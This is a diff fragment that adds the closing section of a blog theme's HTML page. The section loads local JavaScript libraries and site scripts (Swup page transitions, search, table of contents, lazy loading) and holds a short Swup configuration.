+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
